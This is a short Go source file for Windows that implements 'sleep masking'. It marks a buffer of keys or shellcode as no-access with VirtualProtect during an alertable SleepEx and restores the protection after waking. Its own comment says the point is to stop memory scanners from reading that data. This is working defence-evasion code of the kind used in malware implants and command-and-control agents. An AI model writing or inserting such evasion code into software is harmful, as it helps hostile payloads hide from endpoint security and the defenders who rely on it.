//go:build windows

package main

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32    = windows.NewLazySystemDLL("kernel32.dll")
	procSleepEx = kernel32.NewProc("SleepEx")
)

// maskedSleep implements Windows sleep masking:
//  1. Marks sensitiveData as PAGE_NOACCESS via VirtualProtect before sleeping,
//     so memory scanners cannot read keys/shellcode during the sleep window.
//  2. Uses SleepEx (alertable) instead of time.Sleep for APC compatibility.
//  3. Restores the original page protection after waking.
func maskedSleep(duration time.Duration, sensitiveData []byte) {
	const (
		pageNoaccess  = 0x01
		pageReadwrite = 0x04
	)

	var oldProtect uint32
	protected := len(sensitiveData) > 0

	if protected {
		windows.VirtualProtect(
			uintptr(unsafe.Pointer(&sensitiveData[0])),
			uintptr(len(sensitiveData)),
			pageNoaccess,
			&oldProtect,
		)
	}

	// SleepEx(dwMilliseconds, bAlertable=TRUE)
	ms := uint32(duration.Milliseconds())
	if ms == 0 {
		ms = 1
	}
	procSleepEx.Call(uintptr(ms), 1)

	if protected {
		windows.VirtualProtect(
			uintptr(unsafe.Pointer(&sensitiveData[0])),
			uintptr(len(sensitiveData)),
			oldProtect,
			&oldProtect,
		)
	}
}
